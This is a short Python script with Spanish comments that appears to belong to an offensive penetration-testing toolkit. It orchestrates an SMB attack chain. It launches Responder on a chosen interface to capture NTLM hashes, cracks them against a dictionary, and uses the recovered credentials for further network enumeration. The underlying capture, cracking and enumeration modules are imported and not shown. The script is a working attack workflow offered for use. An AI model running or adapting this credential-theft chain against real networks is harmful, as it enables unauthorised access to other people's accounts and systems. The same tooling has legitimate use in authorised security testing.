import sys
import os

# Añadir path raíz al sys.path
CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
ROOT_DIR = os.path.abspath(os.path.join(CURRENT_DIR, ".."))
if ROOT_DIR not in sys.path:
    sys.path.insert(0, ROOT_DIR)

from modules.credential_capture import run_responder
from modules.hash_cracking import crack_hashes
from modules.advanced_enumeration import enumerate_with_credentials

def ejecutar_ataque_smb(interface, dictionary_path):
    print("[*] Lanzando ataque SMB: Responder + Crackeo + Enumeración")

    hashes_path = "results/hashes.txt"

    # Limpiar hashes anteriores
    try:
        if os.path.exists(hashes_path):
            os.remove(hashes_path)
            print("[*] Hashes anteriores eliminados.")
    except Exception as e:
        print(f"[!] No se pudo eliminar hashes anteriores: {e}")
        input("[*] Pulsa ENTER para cerrar esta terminal.")
        return

    try:
        run_responder(interface)
    except Exception as e:
        print(f"[!] Error ejecutando Responder: {e}")
        input("[*] Pulsa ENTER para cerrar esta terminal.")
        return

    if not os.path.exists(hashes_path) or os.path.getsize(hashes_path) == 0:
        print("[-] No se capturaron hashes.")
        input("[*] Pulsa ENTER para cerrar esta terminal.")
        return

    print("[+] Hashes capturados. Iniciando crackeo...")

    credenciales = crack_hashes(hashes_path, dictionary_path)
    if not credenciales:
        print("[!] No se pudo crackear ningún hash.")
        input("[*] Pulsa ENTER para cerrar esta terminal.")
        return

    print("[+] Hashes crackeados. Ejecutando enumeración avanzada...")

    try:
        enumerate_with_credentials(credenciales)
        print("[✓] Módulo SMB finalizado correctamente.")
    except Exception as e:
        print(f"[!] Error durante la enumeración: {e}")
        input("[*] Pulsa ENTER para cerrar esta terminal.")
        return

    # Si todo fue bien, termina y la terminal se cerrará automáticamente

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Uso: python3 smb_runner.py <INTERFAZ> <DICCIONARIO>")
        sys.exit(1)

    interfaz = sys.argv[1]
    diccionario = sys.argv[2]
    ejecutar_ataque_smb(interfaz, diccionario)